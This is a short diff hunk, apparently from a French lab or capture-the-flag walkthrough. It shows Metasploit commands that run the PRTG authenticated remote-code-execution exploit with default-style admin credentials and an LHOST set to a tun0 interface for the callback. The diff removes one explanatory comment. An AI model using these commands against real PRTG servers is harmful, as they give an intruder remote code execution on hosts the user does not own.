@@ -165,7 +165,7 @@ use exploit/windows/http/prtg_authenticated_rce
 set RHOSTS <IP_CIBLE>
 set ADMIN_USERNAME prtgadmin
 set ADMIN_PASSWORD PrTg@dmin2019
-set LHOST tun0            # ← PAS l'IP VirtualBox 10.0.2.x, ni la cible
+set LHOST tun0           
 run
 ```
 
